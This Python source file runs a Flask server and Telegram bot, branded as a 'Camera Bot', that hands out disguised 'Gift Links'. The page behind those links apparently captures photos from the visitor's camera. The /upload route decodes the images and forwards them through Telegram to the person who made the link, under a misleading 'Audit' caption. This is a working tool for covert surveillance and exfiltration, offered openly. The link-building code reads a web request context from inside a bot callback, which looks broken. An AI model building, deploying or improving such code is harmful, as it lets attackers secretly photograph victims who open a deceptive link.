import os, base64, threading, sqlite3, time, telebot
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

# --- Configuration ---
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMINS = [518067190, 7162565886] 
CONTACT_OWNER_LINK = "https://t.me/HackersColony"
TG_CHANNEL = "https://t.me/HackersColony"
YT_CHANNEL = "https://youtube.com/@hackers_colony_tech?si=EXxJtogSUPc8Q4zM"

bot = telebot.TeleBot(BOT_TOKEN)

def init_db():
    conn = sqlite3.connect('users.db')
    conn.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect('users.db')
    conn.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📢 Join Telegram 📢", url=TG_CHANNEL),
        types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_CHANNEL),
        types.InlineKeyboardButton("✅ I Have Joined ✅", callback_data="check_join")
    )
    bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony Camera Bot ⚡️📸</b>\n\nTo use this service, join our channels first!", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "check_join":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"),
            types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"),
            types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"),
            types.InlineKeyboardButton("👨‍💻 Contact Owner", url=CONTACT_OWNER_LINK)
        )
        bot.edit_message_text("<b>Welcome Back to Hacker's Colony! 🎯</b>\nSelect your camera mode:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)

    elif call.data.startswith("m_"):
        mode = call.data.split("_")[1]
        link = f"{request.host_url.rstrip('/')}?m={mode}&uid={call.message.chat.id}"
        bot.send_message(call.message.chat.id, f"🎁 <b>Your Gift Link:</b>\n\n<code>{link}</code>", parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.chat.id in ADMINS:
        msg_text = message.text.replace('/broadcast ', '')
        conn = sqlite3.connect('users.db')
        users = conn.execute('SELECT user_id FROM users').fetchall()
        conn.close()
        for u in users:
            try: bot.send_message(u[0], msg_text)
            except: pass
        bot.send_message(message.chat.id, "✅ Broadcast completed!")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    img_data = base64.b64decode(data.get('image').split(',')[1])
    caption = f"🛡️ <b>Audit:</b> {data.get('mode').upper()} MODE\n✨ Created by Roshan Ali ✨"
    bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
    return jsonify({"status": "success"})

if __name__ == "__main__":
    init_db()
    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
           
